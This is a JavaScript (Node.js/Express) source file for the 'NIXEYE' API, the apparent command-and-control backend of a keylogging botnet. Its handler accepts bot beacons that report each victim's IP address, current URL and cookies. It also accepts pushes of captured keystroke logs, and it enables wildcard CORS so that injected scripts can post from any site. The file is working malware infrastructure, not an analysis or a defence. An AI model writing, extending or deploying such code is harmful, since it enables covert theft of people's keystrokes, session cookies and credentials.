/*
 * 
 * NIXEYE API ROUTING SCHEME
 * ================= (alpha)
 * 
 */

var BotCore = require("../core/bot.core.js").BotCore;
var errorlog = require('../core/logs.core.js').ErrorLog;
var eventlog = require('../core/logs.core.js').EventLog;



// main api handler route
exports.apihandler = function(req, res){
	
	// Enable CORS
	res.header('Access-Control-Allow-Origin', '*');
	res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
	
	// declaring main params holders / get their data...
	var nxid = req.param('nxid'), nxop = req.param('nxop');

	// validating main params
	if(
		((typeof(nxid) === 'undefined') || (nxid === null) || (nxid.length <= 0)) ||
		((typeof(nxop) === 'undefined') || (nxop === null) || (nxop.length <= 0))
		
	){res.send({state: false}, 402); errorlog.warn('API invoque with invalid params | ' + req.connection.remoteAddress);}
	else{
		
		// declaring new bot core instance
		var botcore = new BotCore();
		var response = {};
		
		// matching operation ID
		switch(nxop){
			
			/* BOT BEACON */
			case 'nx01':
				
				// updating operation id
				response.nxop = nxop;
				
				// gathering required param
				var urlprm = req.param('spt');
				var cks = req.param('cks');
				
				// executing beacon handler
				botcore.beaconCheck(nxid, req.connection.remoteAddress, urlprm, cks, function(err, bres){
					
					// fail safe bail out
					if(err){errorlog.error(err); response.state = false; res.send(response, 402);}
					else{response.state = true; res.send(response, 200);}
				});
				break;
				
				
				
				
			/* KEYLOGS DATA PUSH */
			case 'nx02':
			
				// updating operation id
				response.nxop = nxop;
				
				// gather required params
				var klogs = req.param('klg');
				var urlprm = req.param('spt');
				
				// validating gathered params
				if(((typeof(klogs) === 'undefined') || (klogs === null)))
				{response.state = false; res.send(response);}
				else{
					
					// form data push handler
					botcore.pushKeylogs(nxid, klogs, urlprm, function(err, klogres){
						
						// fail safe bail out
						if(err){errorlog.error(err); response.state = false; res.send(response, 402);}
						else{response.state = true; res.send(response, 200);}
					});
				}
				break;
				
				
				
			// BAIL OUT
			default:
			
				res.send({state: false});
				break;
		}
	}
};
